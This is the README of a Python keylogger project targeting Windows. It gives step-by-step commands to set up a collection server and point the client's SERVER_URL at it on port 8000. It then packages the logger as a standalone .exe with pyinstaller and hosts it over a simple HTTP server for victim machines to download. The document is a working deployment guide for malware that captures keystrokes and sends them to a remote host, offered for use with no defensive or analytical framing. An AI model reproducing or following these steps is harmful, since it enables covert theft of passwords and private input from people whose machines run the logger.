## creadit
https://github.com/adisakshya/keylogger

# KeyLogger-Python3
- python 3.12++
# OS Agent/Client Subport
- Windows
# Server Setup
```
git clone https://github.com/passapol146990/KeyLogger-Python3.git

cd KeyLogger-Python3

python3 -m venv ./venv

source .venv/bin/activate

pip install -r requirement.txt

ip a
---- set server ip port 8000 ----

nano  ./client/client_p.py #SERVER_URL = "http://{server ip}:8000"

pyinstaller --onefile ./runKeyLogger.py
```
#Agent downsload File .exe in directory "dist"
```
cd dist

python3 -m http.server
```
# Run server
```
cd server

python server_p.py
```
